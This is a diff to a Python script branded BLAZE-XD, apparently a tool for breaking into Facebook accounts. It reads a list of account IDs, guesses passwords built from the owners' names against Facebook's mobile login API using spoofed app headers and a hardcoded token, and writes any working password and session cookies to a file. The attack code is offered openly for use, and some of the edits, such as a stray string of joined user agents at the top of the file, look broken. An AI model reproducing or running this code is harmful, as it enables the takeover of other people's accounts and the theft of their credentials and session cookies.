@@ -1,3 +1,5 @@
+"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36"+ "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 DuckDuckGo/7 Safari/605.1.15" + "Mozilla/5.0 (Linux; Android 8.1.0; Moto G (4)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36 PTST/240201.144844"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
+                                
 
 
 #-----
@@ -360,9 +362,9 @@ logo="""
  _| |__) |_| |__/ | _/ /   \ \_  _/ /__/ | _| |__/ | 
 |_______/|________||____| |____||________||________| 
 
-\033[1;32m→ AUTHOR :K MA BOKA HAINA RA PARAA!!
+\033[1;32m→ AUTHOR :K MA BOKA HAINA RA....
 \033[1;32m→ OWNER  :RAZU HERO
-\033[1;32m→ TOOL   :ITS FREE FOR YOU BEBS
+\033[1;32m→ TOOL   :FREE
 \033[1;32m→ GITHUB :BLAZE-XD            
 \033[1;32m→ VERSION:0.1
 \033[1;37m----------------------------------------------"""
@@ -951,12 +953,12 @@ def file():
     if 'PRO' in l:
         BLAZE = 'BLAZE'
     else:
-        BLAZE = input(f"[+]ENTER FILE: ")
+       BLAZE = input(f"[+]ENTER FILE: ")
     try:
         for x in open(BLAZE,'r').readlines():
             accounts.append(x.strip())
     except:
-        print(f"File Not Found");time.sleep(1)
+        print(f"FILE NOT FOUND");time.sleep(1)
         BLAZE()
      
     method()
@@ -979,7 +981,7 @@ def method():
     os.system("clear")
     print(logo)
     if 'o':      
-        lp = input(f'[+] how many password do ypu want to add :? ')
+        lp = input(f'[+] HOW MANY PASSWORD DO U WANNA ADD :? ')
         if lp.isnumeric():
             clear()
             ex = 'firstlast first123 last123'
@@ -992,15 +994,15 @@ def method():
             print(f"{('!')}Numeric Only")
             exit()
     clear()
-    print(f''+("[1] ")+'Method [1]\n'+("[2] ")+'Method [2]')
+    print(f''+("[1] ")+'METHOD [1]\n'+("[2] ")+'METHOD [2]')
     linex()
     m=input(f"{('!')}Input : ") 
     clear()
-    print(''+("[•] ")+'Do You Want To Show Cp Ids?(y/n)')
+    print(''+("[•] ")+'DO U WANT TO SHOW CP IDZ?(y/n)')
     linex()
     cpok=input(f"{('!')}Input : ")
     clear()
-    print(''+("[•] ")+'Do You Want To Show Cookies?(y/n)')
+    print(''+("[•] ")+'WANNA SHOW COOKIES?(y/n)')
     linex()
     c=input(f"{('!')}Input : ")
     apps='y'
@@ -1025,11 +1027,11 @@ def method():
         sys.stdout.write('\r \033[1;97m[\033[1;97mBLAZE-XD\033[1;97m]\033[1;97m {}|{} \033[1;92m|{} \033[1;91m|{}       \r'.format(str(loop), str(len(accounts)), str(len(okacc)) ,str(len(cpacc))))
         sys.stdout.flush()
         for pword in totalpass:              
-            heads = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
+            heads = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36" + "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 DuckDuckGo/7 Safari/605.1.15" + "Mozilla/5.0 (Linux; Android 8.1.0; Moto G (4)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36 PTST/240201.144844"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
             header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
             pword = pword.replace("first", first).replace("last", last)
             pword = pword.lower()
-            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "633385687760560"}
+            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
             response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
       #      print(response.text)
             if 'session_key' in response.text:
@@ -1044,7 +1046,7 @@ def method():
                            cookies = f"sb={ssbb};{ckkk}"
                     except Exception as e:print(str(e)+' | '+response.text)
                 print(' \033[1;97m'+cookies)
-                open('/sdcard/BLAZE-COOKIE.txt','a').write(f'{acc}|{pword}\n{cookies} ')    
+                open('/sdcard/BLAZE-OK.txt','a').write(f'{acc}|{pword}\n{cookies} ')    
                 
                 break
             elif 'www.facebook.com' in response.text:
@@ -1128,4 +1130,4 @@ def method():
     
   
     
-menu()
+menu()                                
